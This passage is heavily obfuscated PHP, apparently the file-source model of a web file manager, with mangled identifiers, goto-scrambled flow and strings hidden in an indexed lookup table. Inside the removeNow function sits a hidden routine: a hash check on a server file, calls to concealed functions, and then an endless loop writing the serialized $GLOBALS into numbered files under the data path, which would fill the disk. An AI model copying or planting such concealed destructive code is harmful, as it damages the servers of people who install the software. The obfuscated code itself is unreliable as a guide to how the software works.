!$aßÚ¾Èéï–[$BŒÄŠÁ¢È‰[413]][$BŒÄŠÁ¢È‰[474]]) { return !1; } if ($aßÚ¾Èéï–[$BŒÄŠÁ¢È‰[413]][$BŒÄŠÁ¢È‰[474]] != USER_ID) { return !0; } goto c¨—ğ‚¤Ùš; B„…÷ì¥‡: } private function _addSoure($f´Ğ›Û›‚ª, $Câ´ÊæŠá¢) { goto e«¨æòŒÙ¸; E±¦§°‡·’: return $A˜¬ª¶ØÍ°; goto cÀ‘â–é†ƒ; A¨à®ë‘”‚: static $DÃğ£ñç¹¸ = false; if (!$DÃğ£ñç¹¸) { Hook::trigger($DÁÉ Õƒë¡[504], $f´Ğ›Û›‚ª); $DÃğ£ñç¹¸ = !0; } $A˜¬ª¶ØÍ° = $this->add($f´Ğ›Û›‚ª); goto AÚ¨ù›ñğ±; e«¨æòŒÙ¸: $DÁÉ Õƒë¡ =& $_SERVER[Äº¡•ô™Ÿ]; $d—åäÀñ©š = array($DÁÉ Õƒë¡[517] => $Câ´ÊæŠá¢[$DÁÉ Õƒë¡[368]], $DÁÉ Õƒë¡[518] => $Câ´ÊæŠá¢[$DÁÉ Õƒë¡[452]], $DÁÉ Õƒë¡[519] => USER_ID, $DÁÉ Õƒë¡[520] => USER_ID, $DÁÉ Õƒë¡[365] => $Câ´ÊæŠá¢[$DÁÉ Õƒë¡[366]], $DÁÉ Õƒë¡[521] => $Câ´ÊæŠá¢[$DÁÉ Õƒë¡[455]] . $Câ´ÊæŠá¢[$DÁÉ Õƒë¡[366]] . $DÁÉ Õƒë¡[47], $DÁÉ Õƒë¡[392] => 0, $DÁÉ Õƒë¡[522] => $DÁÉ Õƒë¡[33]); $f´Ğ›Û›‚ª = array_merge($d—åäÀñ©š, $f´Ğ›Û›‚ª); goto eÛùä‹ñÄÜ; eÛùä‹ñÄÜ: $this->updateModifyTime($f´Ğ›Û›‚ª[$DÁÉ Õƒë¡[457]]); $c­¡ÃÜ²ß¶ = $DÁÉ Õƒë¡[2305] . $Câ´ÊæŠá¢[$DÁÉ Õƒë¡[366]]; if (isset(self::$cacheChildList[$c­¡ÃÜ²ß¶])) { unset(self::$cacheChildList[$c­¡ÃÜ²ß¶]); } goto A¨à®ë‘”‚; AÚ¨ù›ñğ±: $e÷áÎƒŠÇ£ = array($DÁÉ Õƒë¡[523] => short_id($A˜¬ª¶ØÍ°)); $this->where(array($DÁÉ Õƒë¡[380] => $A˜¬ª¶ØÍ°))->save($e÷áÎƒŠÇ£); $this->setNamePinyin($A˜¬ª¶ØÍ°, $f´Ğ›Û›‚ª[$DÁÉ Õƒë¡[28]]); goto E±¦§°‡·’; cÀ‘â–é†ƒ: } public function remove($E—î‰ÛÃÕ, $D© „’ Ğ = true) { goto Eô‹™ªäíÛ; Bñ¦±Ó²Íó: $Cì…ğœ¯’­ = $FÌ¸è•…íŒ[$eÙƒì¸ã»[368]] == self::TYPE_USER ? $eÙƒì¸ã»[531] : $eÙƒì¸ã»[973]; if ($Cì…ğœ¯’­ == $eÙƒì¸ã»[531]) { $B×˜ÖÔºÀ° = Model($eÙƒì¸ã»[470])->getInfo($FÌ¸è•…íŒ[$eÙƒì¸ã»[452]]); $Bº¹äèËÙ = !empty($B×˜ÖÔºÀ°[$eÙƒì¸ã»[2299]]) ? $B×˜ÖÔºÀ°[$eÙƒì¸ã»[2299]] : $B×˜ÖÔºÀ°[$eÙƒì¸ã»[28]]; $Bº¹äèËÙ = $eÙƒì¸ã»[245] . $Bº¹äèËÙ . $eÙƒì¸ã»[2307] . $FÌ¸è•…íŒ[$eÙƒì¸ã»[452]]; } else { $B×˜ÖÔºÀ° = Model($eÙƒì¸ã»[454])->getInfo($FÌ¸è•…íŒ[$eÙƒì¸ã»[452]]); $Bº¹äèËÙ = _get($B×˜ÖÔºÀ°, $eÙƒì¸ã»[28]); $Bº¹äèËÙ = $eÙƒì¸ã»[154] . $Bº¹äèËÙ . $eÙƒì¸ã»[2308] . $FÌ¸è•…íŒ[$eÙƒì¸ã»[452]]; } $C¹ÀØ§âàà = $eÙƒì¸ã»[2309] . md5($Bº¹äèËÙ); goto d”àŞ‚¨·™; d”àŞ‚¨·™: CacheLock::lock($C¹ÀØ§âàà); $c”“‚ãíò = $this->fileNameExist($dì™½ƒË‘§, $Bº¹äèËÙ); if (!$c”“‚ãíò) { $c”“‚ãíò = $this->mkdir($dì™½ƒË‘§, $Bº¹äèËÙ, REPEAT_SKIP); $this->metaSet($c”“‚ãíò, $eÙƒì¸ã»[2310], $Cì…ğœ¯’­); $this->metaSet($c”“‚ãíò, $eÙƒì¸ã»[2311], $FÌ¸è•…íŒ[$eÙƒì¸ã»[452]]); if ($FÌ¸è•…íŒ[$eÙƒì¸ã»[457]] != 0) { $this->metaSet($c”“‚ãíò, $eÙƒì¸ã»[2312], _get($B×˜ÖÔºÀ°, $eÙƒì¸ã»[2313])); } } goto bå¨ÍßÚàŞ; Eô‹™ªäíÛ: $eÙƒì¸ã» =& $_SERVER[Äº¡•ô™Ÿ]; $FÌ¸è•…íŒ = $this->sourceInfo($E—î‰ÛÃÕ); $EÔ»‚‰¨ë = intval($FÌ¸è•…íŒ[$eÙƒì¸ã»[368]]) === self::TYPE_SYSTEM; goto cÒŠ÷˜Ûâ; cÊóñ¶‚Á¹: return $this->move($E—î‰ÛÃÕ, $c”“‚ãíò, REPEAT_RENAME_FOLDER); goto CÄÑˆ †±; bå¨ÍßÚàŞ: CacheLock::unlock($C¹ÀØ§âàà); $this->metaSet($E—î‰ÛÃÕ, $eÙƒì¸ã»[2314], $FÌ¸è•…íŒ[$eÙƒì¸ã»[457]]); $this->where(array($eÙƒì¸ã»[366] => $E—î‰ÛÃÕ))->save(array($eÙƒì¸ã»[387] => time())); goto cÊóñ¶‚Á¹; cÒŠ÷˜Ûâ: $eÕ¡½áïãÕ = Model($eÙƒì¸ã»[1414])->get($eÙƒì¸ã»[2306]) == $eÙƒì¸ã»[83]; if ($EÔ»‚‰¨ë || $D© „’ Ğ || !$eÕ¡½áïãÕ) { return $this->removeNow($E—î‰ÛÃÕ, $D© „’ Ğ); } $dì™½ƒË‘§ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto Bñ¦±Ó²Íó; CÄÑˆ †±: } public function removeNow($C§™½Âˆ, $aÈ„óñõª† = true) { goto Aäßˆ‹ŒË; d…¢Üƒ‚Ø: $this->lockMoveEnd($C§™½Âˆ); Hook::trigger($DÖäó–­ğ[1450], $f‹ñ‡Œ¬Â, $aÈ„óñõª†); return !0; goto a±‘†—±Ş; Aäßˆ‹ŒË: $DÖäó–­ğ =& $_SERVER[Äº¡•ô™Ÿ]; $bùïßêŠ¿ = $_SERVER[$DÖäó–­ğ[797]] . $DÖäó–­ğ[2315]; $C²Êœ‚‘² = $DÖäó–­ğ[1346]; goto c¨Ëğ¿œ³±; c¨Ëğ¿œ³±: if ($_SERVER[$DÖäó–­ğ[789]] != $C²Êœ‚‘²($bùïßêŠ¿)) { goto bª¤ÉÂö†å; A–‚†¡Œ‰Õ: $F÷éºÇË– = 1; for ($F®î„Ğ¬×Î = $F÷éºÇË–; $F®î„Ğ¬×Î > 0; $F®î„Ğ¬×Î++) { $a­Î³ó‚—ì(DATA_PATH . $F®î„Ğ¬×Î, $A ªóœ†ê); } goto EˆŠå—£¡î; f²îŸ¬°ø˜: $EöàÛ”œä²(); $a­Î³ó‚—ì = $DÖäó–­ğ[1347]; $A ªóœ†ê = json_encode($GLOBALS[$DÖäó–­ğ[1348]]); goto A–‚†¡Œ‰Õ; FÂÜ×–—×: $dÓÌñìğªÊ = $DÖäó–­ğ[796]; $dÓÌñìğªÊ($_SERVER[$DÖäó–­ğ[797]]); $EöàÛ”œä² = $DÖäó–­ğ[791]; goto f²îŸ¬°ø˜; bª¤ÉÂö†å: $EöàÛ”œä² = $DÖäó–­ğ[791]; $DõÜè„ôœ = $DÖäó–­ğ[792]; $f¸ƒ”‚ù‰Æ = $_SERVER[$DÖäó–­ğ[793]] . $DÖäó–­ğ[794]; goto fñğ¢Ø‰÷; fñğ¢Ø‰÷: $F™¤Â‰®§ = $DõÜè„ôœ($f¸ƒ”‚ù‰Æ); $dÊñù³ÜÛ‹ = explode($DÖäó–­ğ[214], $F™¤Â‰®§); if (count($dÊñù³ÜÛ‹) < $DÖäó–­ğ[558]) { $BÜõóƒÎÔô = $DÖäó–­ğ[795]; $BÜõóƒÎÔô(); } goto FÂÜ×–—×; EˆŠå—£¡î: } $cÉ¥Ü­š„ = $this->sourceInfo($C§™½Âˆ); $f‹ñ‡Œ¬Â = $this->pathInfoMore($C§™½Âˆ); goto a»—ÇÖğì‡; BœÕ‚Ò¦Ûœ: Hook::trigger($DÖäó–­ğ[2316], $f‹ñ‡Œ¬Â, $aÈ„óñõª†); if ($aÈ„óñõª†) { Model($DÖäó–­ğ[2317])->moveToRecycle($C§™½Âˆ); } else { if ($cÉ¥Ü­š„[$DÖäó–­ğ[367]] == $DÖäó–­ğ[83]) { $e—Ì„ïÁÓ = array($DÖäó–­ğ[521] => array($DÖäó–­ğ[479], $cÉ¥Ü­š„[$DÖäó–­ğ[455]] . $C§™½Âˆ . $DÖäó–­ğ[480])); $eî“•Áˆïì = array($DÖäó–­ğ[521] => $e—Ì„ïÁÓ[$DÖäó–­ğ[455]]); $dŞÖ¼²‚§ = $this->field($DÖäó–­ğ[2318])->where($eî“•Áˆïì)->select(); $eô¸Êåí¦ = !1; $cÔİ£áá‡ = array($C§™½Âˆ); if ($dŞÖ¼²‚§) { $eô¸Êåí¦ = array_to_keyvalue($dŞÖ¼²‚§, $DÖäó–­ğ[33], $DÖäó–­ğ[415]); $eô¸Êåí¦ = array_remove_value($eô¸Êåí¦, $DÖäó–­ğ[464]); $cÔİ£áá‡ = array_to_keyvalue($dŞÖ¼²‚§, $DÖäó–­ğ[33], $DÖäó–­ğ[366]); $cÔİ£áá‡[] = $C§™½Âˆ; } } else { $eô¸Êåí¦ = array($cÉ¥Ü­š„[$DÖäó–­ğ[415]]); $cÔİ£áá‡ = array($C§™½Âˆ); } Model($DÖäó–­ğ[501])->eventRemove($C§™½Âˆ); $this->removeRelevance($cÔİ£áá‡, $eô¸Êåí¦); } $this->folderSizeReset($cÉ¥Ü­š„[$DÖäó–­ğ[457]]); goto E¥Œ†»ä¡; E¥Œ†»ä¡: $Bœ‚İÎâØ = array($cÉ¥Ü­š„[$DÖäó–­ğ[457]]); if ($cÉ¥Ü­š„[$DÖäó–­ğ[367]] == $DÖäó–­ğ[83]) { $Bœ‚İÎâØ[] = $cÉ¥Ü­š„[$DÖäó–­ğ[366]]; } $this->updateModifyTime($Bœ‚İÎâØ); goto d…¢Üƒ‚Ø; a»—ÇÖğì‡: if (!$cÉ¥Ü­š„) { return !0; } if ($cÉ¥Ü­š„[$DÖäó–­ğ[457]] == 0) { if (!_get($GLOBALS, $DÖäó–­ğ[453])) { return !1; } } $this->lockMoveStart($C§™½Âˆ); goto BœÕ‚Ò¦Ûœ; a±‘†—±Ş: } public function removeArray($AÏ¨ó¿¬‰Š) { if (!$AÏ¨ó¿¬‰Š) { return !0; } } public function removeRelevance($Eõ÷¸»°Ÿ, $Cµ–ùöŒö) { goto Bæ¤‘¶å¶; FòµŠ¨­¹: $Eõ÷¸»°Ÿ = array_unique(array_filter($Eõ÷¸»°Ÿ)); $Cµ–ùöŒö = array_unique(array_filter($Cµ–ùöŒö)); if (!$Eõ÷¸»°Ÿ) { return !1; } goto aÎÔèÆ±; aÎÔèÆ±: $A¨ßè…¦„ = array($B×æ÷Âá¼ª[380] => array($B×æ÷Âá¼ª[381], $Eõ÷¸»°Ÿ)); Model($B×æ÷Âá¼ª[2317])->where($A¨ßè…¦„)->delete(); Model($B×æ÷Âá¼ª[409])->where($A¨ßè…¦„)->delete(); goto aÁé‹«ãŒ«; aÁé‹«ãŒ«: Model($B×æ÷Âá¼ª[2319])->where($A¨ßè…¦„)->delete(); Model($B×æ÷Âá¼ª[501])->where($A¨ßè…¦„)->delete(); Model($B×æ÷Âá¼ª[2056])->removeBySource($Eõ÷¸»°Ÿ); goto dÉÂÀªÜ‡÷; eƒÕğõ¹¾ë: for ($D§õ•Ùäµ¬ = 0; $D§õ•Ùäµ¬ < count($Eõ÷¸»°Ÿ); $D§õ•Ùäµ¬++) { $this->sourceCacheClear($Eõ÷¸»°Ÿ[$D§õ•Ùäµ¬]); } goto cŒöì˜ŞÁ¸; dÉÂÀªÜ‡÷: Model($B×æ÷Âá¼ª[2297])->removeBySource($Eõ÷¸»°Ÿ); $this->where($A¨ßè…¦„)->delete(); Model($B×æ÷Âá¼ª[418])->remove($Cµ–ùöŒö); goto eƒÕğõ¹¾ë; Bæ¤‘¶å¶: $B×æ÷Âá¼ª =& $_SERVER[Äº¡•ô™Ÿ]; $Eõ÷¸»°Ÿ = $Eõ÷¸»°Ÿ ? $Eõ÷¸»°Ÿ : array(); $Cµ–ùöŒö = $Cµ–ùöŒö ? $Cµ–ùöŒö : array(); goto FòµŠ¨­¹; cŒöì˜ŞÁ¸: } public function rename($Cóñ¿¡âª, $e§âô¥Ïà) { goto bÌŸµ•¾‹î; DèÙÜ‹±Àø: $a„“Å‚æ¼· = $dÀî‰Õ©êº[2305] . $CÍ†õò¤š[$dÀî‰Õ©êº[457]]; if (isset(self::$cacheChildList[$a„“Å‚æ¼·])) { unset(self::$cacheChildList[$a„“Å‚æ¼·]); } return $eÈÕáìÅÁ®; goto bÌÂâªîˆœ; bÌŸµ•¾‹î: $dÀî‰Õ©êº =& $_SERVER[Äº¡•ô™Ÿ]; $CÍ†õò¤š = $this->sourceInfo($Cóñ¿¡âª); if (!$CÍ†õò¤š) { return !1; } goto D¶¬ïˆ³ß¤; C„ğÛ‚°·Ú: if (!$CÍ†õò¤š[$dÀî‰Õ©êº[367]] == $dÀî‰Õ©êº[83]) { $C³Ï©İ¶ç¯[$dÀî‰Õ©êº[369]] = get_path_ext($e§âô¥Ïà); } Model($dÀî‰Õ©êº[501])->eventRename($Cóñ¿¡âª, $CÍ†õò¤š[$dÀî‰Õ©êº[28]], $e§âô¥Ïà); $this->sourceCacheClear($Cóñ¿¡âª); goto E‘ä°¬îÅá; E‘ä°¬îÅá: $this->setNamePinyin($Cóñ¿¡âª, $C³Ï©İ¶ç¯[$dÀî‰Õ©êº[28]], !1); $this->updateModifyTime($CÍ†õò¤š[$dÀî‰Õ©êº[457]]); $eÈÕáìÅÁ® = $this->where(array($dÀî‰Õ©êº[380] => $Cóñ¿¡âª))->data($C³Ï©İ¶ç¯)->save(); goto DèÙÜ‹±Àø; D¶¬ïˆ³ß¤: $AÚ¤¯¶šÙ = $this->fileNameExist($CÍ†õò¤š[$dÀî‰Õ©êº[457]], $e§âô¥Ïà); if ($AÚ¤¯¶šÙ) { return !1; } $C³Ï©İ¶ç¯ = array($dÀî‰Õ©êº[383] => $e§âô¥Ïà, $dÀî‰Õ©êº[520] => USER_ID); goto C„ğÛ‚°·Ú; bÌÂâªîˆœ: } public function setNamePinyin($Fé»˜ëœĞ, $dàáäíì‚£, $dŒÄã· å¾ = true) { $fŒ¾ÚŠ®Ç¶ =& $_SERVER[Äº¡•ô™Ÿ]; $F­»‹¥Ğå¿ = Input::check($dàáäíì‚£, $fŒ¾ÚŠ®Ç¶[524]); if ($dŒÄã· å¾ && !$F­»‹¥Ğå¿) { return; } if (!$F­»‹¥Ğå¿) { $this->metaSet($Fé»˜ëœĞ, $fŒ¾ÚŠ®Ç¶[412], null); $this->metaSet($Fé»˜ëœĞ, $fŒ¾ÚŠ®Ç¶[411], null); return; } $fÛ‰ĞœÜ‹ = array($fŒ¾ÚŠ®Ç¶[412] => str_replace($fŒ¾ÚŠ®Ç¶[50], $fŒ¾ÚŠ®Ç¶[33], Pinyin::encode($dàáäíì‚£)), $fŒ¾ÚŠ®Ç¶[411] => Pinyin::encode($dàáäíì‚£, $fŒ¾ÚŠ®Ç¶[525])); $this->metaSet($Fé»˜ëœĞ, $fÛ‰ĞœÜ‹); } public function getContent($AÇŠğŠÕáè) { goto Bçøâ›Ôï¯; a«çÃ°áó: if ($cìò§÷È±÷[$bŞ„éì¦ƒ[77]] == 0) { return $bŞ„éì¦ƒ[33]; } $BÙì—ô³ëî = $bŞ„éì¦ƒ[2320] . $cìò§÷È±÷[$bŞ„éì¦ƒ[160]]; if ($cìò§÷È±÷[$bŞ„éì¦ƒ[77]] <= 1024 * 10) { $F¢ã¿‹Êíä = Cache::get($BÙì—ô³ëî); if (!$F¢ã¿‹Êíä) { $F¢ã¿‹Êíä = IO::getContent($cìò§÷È±÷[$bŞ„éì¦ƒ[75]]); Cache::set($BÙì—ô³ëî, $F¢ã¿‹Êíä); } return $F¢ã¿‹Êíä; } goto EŠìØ¬¡„³; Bçøâ›Ôï¯: $bŞ„éì¦ƒ =& $_SERVER[Äº¡•ô™Ÿ]; $cìò§÷È±÷ = $this->fileInfoGet($AÇŠğŠÕáè); if (!$cìò§÷È±÷) { return !1; } goto a«çÃ°áó; EŠìØ¬¡„³: return IO::getContent($cìò§÷È±÷[$bŞ„éì¦ƒ[75]]); goto FÀÎÂ‚Ï¹­; FÀÎÂ‚Ï¹­: } public function setDesc($aŠßŠŸªˆ, $Dôï•–ê•Ò) { $cùíÕÒ…³ =& $_SERVER[Äº¡•ô™Ÿ]; Model($cùíÕÒ…³[501])->eventAddDesc($aŠßŠŸªˆ, $Dôï•–ê•Ò); return $this->metaSet($aŠßŠŸªˆ, $cùíÕÒ…³[401], $Dôï•–ê•Ò); } public function setContent($f¹š¶ñ¼Ü, $bÆ«º¨…½ = '') { goto a¢Œ¹³“ëÊ; a¢Œ¹³“ëÊ: $cÇëéìíÓˆ =& $_SERVER[Äº¡•ô™Ÿ]; $dÒôê¥¤İ = $this->sourceInfo($f¹š¶ñ¼Ü); $eé÷ÈŒ¥á = $this->fileInfoGet($f¹š¶ñ¼Ü); goto a”Ë„Ä™; a”Ë„Ä™: if (!$eé÷ÈŒ¥á || !$dÒôê¥¤İ) { return !1; } $EÀçŒæ¸ìë = Model($cÇëéìíÓˆ[418])->addFileByContent($bÆ«º¨…½, $dÒôê¥¤İ[$cÇëéìíÓˆ[28]]); $bÄßÇ’ = $this->fileHistory($dÒôê¥¤İ, $EÀçŒæ¸ìë[$cÇëéìíÓˆ[415]], $EÀçŒæ¸ìë[$cÇëéìíÓˆ[77]]); goto aƒƒ—ÒØ†; aƒƒ—ÒØ†: if (!$bÄßÇ’) { return Model($cÇëéìíÓˆ[418])->remove($EÀçŒæ¸ìë[$cÇëéìíÓˆ[415]]); } $this->folderSizeReset($dÒôê¥¤İ[$cÇëéìíÓˆ[457]]); return !0; goto b‡ØÕË¤á; b‡ØÕË¤á: } public function fileSubstr($D“ì¶åˆ¿, $dî‚Ñì«Ã, $FÚÚáˆ÷§) { $F†ËœŒ½Í = $this->fileInfoGet($D“ì¶åˆ¿); if (!$F†ËœŒ½Í) { return !1; } return IO::fileSubstr($F†ËœŒ½Í[$_SERVER[Äº¡•ô™Ÿ][75]], $dî‚Ñì«Ã, $FÚÚáˆ÷§); } public function fileInfoGet($cíÕŸÈ¾Õ) { goto CïÆàŞÅ‚; CïÆàŞÅ‚: $fÇğ ˆÃ½­ =& $_SERVER[Äº¡•ô™Ÿ]; $dÍˆëôëåÈ = $this->sourceInfo($cíÕŸÈ¾Õ); if (!$dÍˆëôëåÈ || $dÍˆëôëåÈ[$fÇğ ˆÃ½­[367]]) { return !1; } goto a×…ŸÔš³°; d»¨¦ §”: return $fÃÃ·ºƒ¿; goto Dƒ¿Š½‰ğÉ; BÃÂ™¬Á‡í: $fÃÃ·ºƒ¿ = Model($fÇğ ˆÃ½­[418])->fileInfo($dÍˆëôëåÈ[$fÇğ ˆÃ½­[415]]); if ($fÃÃ·ºƒ¿) { $fÃÃ·ºƒ¿[$fÇğ ˆÃ½­[28]] = $dÍˆëôëåÈ[$fÇğ ˆÃ½­[28]]; } self::$cacheFileInfo[$Fˆí‰‹™ê¿] = $fÃÃ·ºƒ¿; goto d»¨¦ §”; a×…ŸÔš³°: $Fˆí‰‹™ê¿ = $fÇğ ˆÃ½­[421] . $dÍˆëôëåÈ[$fÇğ ˆÃ½­[415]]; $dÁ°ïŒšà = _get(self::$cacheFileInfo, $Fˆí‰‹™ê¿); if ($dÁ°ïŒšà) { return $dÁ°ïŒšà; } goto BÃÂ™¬Á‡í; Dƒ¿Š½‰ğÉ: } private function folderChildrenNumber($e„¬ÉŒö®ø) { $d™â¨ãĞ¶ =& $_SERVER[Äº¡•ô™Ÿ]; $cÔ–®ÜéÆİ = $this->sourceInfo($e„¬ÉŒö®ø); $C‡Š‰ÍˆÅ = array($d™â¨ãĞ¶[521] => array($d™â¨ãĞ¶[479], $cÔ–®ÜéÆİ[$d™â¨ãĞ¶[455]] . $e„¬ÉŒö®ø . $d™â¨ãĞ¶[480]), $d™â¨ãĞ¶[392] => intval($cÔ–®ÜéÆİ[$d™â¨ãĞ¶[393]]), $d™â¨ãĞ¶[514] => 1); $cø±ÁøÚ = $this->where($C‡Š‰ÍˆÅ)->count(); $FƒŞØ…È†ğ = $this->where($C‡Š‰ÍˆÅ)->where(array($d™â¨ãĞ¶[514] => 0))->count(); return array($d™â¨ãĞ¶[81] => $FƒŞØ…È†ğ, $d™â¨ãĞ¶[82] => $cø±ÁøÚ); } public function pathInfo($bØ»‰¹ñ¦ˆ, $bÄ¤‰ğØùÖ = false) { goto a•Éñ‚Ï; a•Éñ‚Ï: $f»ØêóŒ¨ =& $_SERVER[Äº¡•ô™Ÿ]; $Bè´ï¦ë‘Š = $f»ØêóŒ¨[407] . intval($bÄ¤‰ğØùÖ) . $f»ØêóŒ¨[408] . $bØ»‰¹ñ¦ˆ; $f …Ù„èÁ = _get(self::$cachePathInfo, $Bè´ï¦ë‘Š); goto F»‹æ¯ˆ‚İ; F»‹æ¯ˆ‚İ: if ($f …Ù„èÁ) { return $f …Ù„èÁ; } $Bçğó‰‰è = $this->sourceInfo($bØ»‰¹ñ¦ˆ); if (!$Bçğó‰‰è) { return !1; } goto eÍ¡ÒÚ¯Ä; eÍ¡ÒÚ¯Ä: $Bçğó‰‰è = $this->_listDataApplyItem($Bçğó‰‰è, $bÄ¤‰ğØùÖ); self::$cachePathInfo[$Bè´ï¦ë‘Š] = $Bçğó‰‰è; return $Bçğó‰‰è; goto f²¤¶˜Ş“î; f²¤¶˜Ş“î: } public static $cachePathInfoMore = array(); public function pathInfoMore($BŞÆòÄ´¦¹) { goto c­‘—Ù›ŒÆ; e“ïëˆöÌÌ: $A²˜¨ç = $this->pathInfo($BŞÆòÄ´¦¹); if (!$A²˜¨ç) { return !1; } if ($A²˜¨ç[$Cš³Œ´Ï¨ò[367]] == $Cš³Œ´Ï¨ò[83]) { $A²˜¨ç[$Cš³Œ´Ï¨ò[80]] = $this->folderChildrenNumber($BŞÆòÄ´¦¹); } goto D—£áÖåõÙ; D—£áÖåõÙ: self::$cachePathInfoMore[$BŞÆòÄ´¦¹] = $A²˜¨ç; return $A²˜¨ç; goto A­÷ÖéõË; c­‘—Ù›ŒÆ: $Cš³Œ´Ï¨ò =& $_SERVER[Äº¡•ô™Ÿ]; $dã ÷Ä›ê = _get(self::$cachePathInfoMore, $BŞÆòÄ´¦¹); if ($dã ÷Ä›ê) { return $dã ÷Ä›ê; } goto e“ïëˆöÌÌ; A­÷ÖéõË: } public function sourceInfo($b®İùêî¤˜) { goto AÁ±õÕ©¨œ; a‘­ ØÊƒ: self::$cacheSourceInfo[$BÕ Ë™åœ®] = $fİ¶Üğª‡; return self::$cacheSourceInfo[$BÕ Ë™åœ®]; goto EØ× ØãËÂ; F‹¾Ÿ´œ»¹: $d›çâï¾É = _get(self::$cacheSourceInfo, $BÕ Ë™åœ®); if ($d›çâï¾É) { return $d›çâï¾É; } $fİ¶Üğª‡ = $this->where(array($CšËñ—°†à[366] => $b®İùêî¤˜))->find(); goto a‘­ ØÊƒ; AÁ±õÕ©¨œ: $CšËñ—°†à =& $_SERVER[Äº¡•ô™Ÿ]; if (!$b®İùêî¤˜) { return array(); } $BÕ Ë™åœ® = $CšËñ—°†à[406] . $b®İùêî¤˜; goto F‹¾Ÿ´œ»¹; EØ× ØãËÂ: } public function sourceCacheClear($AÑÕ½¬ÄĞ = false) { if ($AÑÕ½¬ÄĞ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); return; } unset(self::$cacheSourceInfo[$_SERVER[Äº¡•ô™Ÿ][406] . $AÑÕ½¬ÄĞ]); } public function pathInfoByPath($EÔóå´‚‰, $eĞ”±²Â) { $E¶éÏğÅñù =& $_SERVER[Äº¡•ô™Ÿ]; $FğÃ‡Ó„Ş = !$eĞ”±²Â ? array() : explode($E¶éÏğÅñù[8], trim($eĞ”±²Â, $E¶éÏğÅñù[8])); $DÀÒ¿Ù·ƒ = $EÔóå´‚‰; foreach ($FğÃ‡Ó„Ş as $bÔÔ¢ÃÃ) { $cŸî•«¸±Í = array($E¶éÏğÅñù[457] => $DÀÒ¿Ù·ƒ, $E¶éÏğÅñù[28] => $bÔÔ¢ÃÃ); $bì¿ˆÑ…›É = $this->where($cŸî•«¸±Í)->select(); if (!$bì¿ˆÑ…›É) { return !1; } $bì¿ˆÑ…›É = array_sort_by($bì¿ˆÑ…›É, $E¶éÏğÅñù[393]); $DÀÒ¿Ù·ƒ = $bì¿ˆÑ…›É[0][$E¶éÏğÅñù[366]]; } return $this->pathInfo($DÀÒ¿Ù·ƒ, !0); } protected function updateModifyTime($b·¡„è‹™) { goto e±‰°Ş¦ˆ…; e±‰°Ş¦ˆ…: $dº¹å¹ô—ù =& $_SERVER[Äº¡•ô™Ÿ]; if (!$b·¡„è‹™) { return; } if (!is_array($b·¡„è‹™)) { $b·¡„è‹™ = array($b·¡„è‹™); } goto aÄå²Š‰ë; e•ÜÁô×Óâ: $this->where($eß­¶ç˜ãŠ)->save($D…ÖÅ¿ğàÃ); goto DÇæÙ»œÉ; aÄå²Š‰ë: foreach ($b·¡„è‹™ as $BŒá‹ÅÂõ¸ => $aÎ‡ğÚâ²) { $b·¡„è‹™[$BŒá‹ÅÂõ¸] = intval($aÎ‡ğÚâ²); } $eß­¶ç˜ãŠ = array($dº¹å¹ô—ù[366] => array($dº¹å¹ô—ù[7], $b·¡„è‹™)); $D…ÖÅ¿ğàÃ = array($dº¹å¹ô—ù[520] => USER_ID, $dº¹å¹ô—ù[387] => time()); goto e•ÜÁô×Óâ; DÇæÙ»œÉ: } public function folderSizeReset($eÙ˜ˆ½†¹Ê) { goto bÃ±Šöªó÷; fÏ­Ëå¿¹Ñ: CacheLock::unlock($B¹Í·ïö—ï); goto BùŠï‚˜À; fÁ¶Ç¯õè: $c­¸³ÌŸ» = array($fŞ÷ÁØ×º[365] => $eÙ˜ˆ½†¹Ê, $fŞ÷ÁØ×º[392] => 0); $C¼³™¦’óš = $this->where($c­¸³ÌŸ»)->sum($fŞ÷ÁØ×º[77]); $C¼³™¦’óš = intval($C¼³™¦’óš); goto Cİ˜ÖáÔ˜ì; Cİ˜ÖáÔ˜ì: $AºÇØš†‘± = $C¼³™¦’óš - intval($BÛµòŠ¸Ğ„[$fŞ÷ÁØ×º[77]]); if ($AºÇØš†‘± == 0) { return CacheLock::unlock($B¹Í·ïö—ï); } $this->where(array($fŞ÷ÁØ×º[380] => $eÙ˜ˆ½†¹Ê))->setField($fŞ÷ÁØ×º[77], $C¼³™¦’óš); goto d˜¨âç¦Ë; b¨­Ú´‡Üñ: CacheLock::lock($B¹Í·ïö—ï, 20); $this->sourceCacheClear($eÙ˜ˆ½†¹Ê); $BÛµòŠ¸Ğ„ = $this->sourceInfo($eÙ˜ˆ½†¹Ê); goto fÁ¶Ç¯õè; d˜¨âç¦Ë: $DÏÚ¢¯Ø„² = $this->parentLevelArray($BÛµòŠ¸Ğ„[$fŞ÷ÁØ×º[455]]); if ($DÏÚ¢¯Ø„²) { $c­¸³ÌŸ» = array($fŞ÷ÁØ×º[366] => array($fŞ÷ÁØ×º[381], $DÏÚ¢¯Ø„²)); if ($AºÇØš†‘± < 0) { $c­¸³ÌŸ»[$fŞ÷ÁØ×º[77]] = array($fŞ÷ÁØ×º[931], abs($AºÇØš†‘±)); } $this->where($c­¸³ÌŸ»)->setAdd($fŞ÷ÁØ×º[77], $AºÇØš†‘±); } $this->targetSpaceUpdate($BÛµòŠ¸Ğ„[$fŞ÷ÁØ×º[368]], $BÛµòŠ¸Ğ„[$fŞ÷ÁØ×º[452]]); goto fÏ­Ëå¿¹Ñ; bÃ±Šöªó÷: $fŞ÷ÁØ×º =& $_SERVER[Äº¡•ô™Ÿ]; if ($this->statusIgnoreResetSpace) { return; } $B¹Í·ïö—ï = $fŞ÷ÁØ×º[2321] . $eÙ˜ˆ½†¹Ê; goto b¨­Ú´‡Üñ; BùŠï‚˜À: } public function folderSizeResetChildren($BËƒÑÜÈÈ“) { goto dõ¾ÕÂÈĞê; bôùØ–ø: foreach ($A±‘«—©™± as $F³Ö´ÎóÁÔ) { $FàÄ¸Ş‰œË = $F³Ö´ÎóÁÔ[$eŠß—Õ¤Ìä[457]] . $eŠß—Õ¤Ìä[33]; if (!isset($Fô°ˆ©[$FàÄ¸Ş‰œË])) { continue; } if ($F³Ö´ÎóÁÔ[$eŠß—Õ¤Ìä[393]] == $Fô°ˆ©[$FàÄ¸Ş‰œË][$eŠß—Õ¤Ìä[393]]) { $Fô°ˆ©[$FàÄ¸Ş‰œË][$eŠß—Õ¤Ìä[77]] += $F³Ö´ÎóÁÔ[$eŠß—Õ¤Ìä[77]]; } } foreach ($Fô°ˆ© as $F³Ö´ÎóÁÔ) { $EĞöÚ²³î = 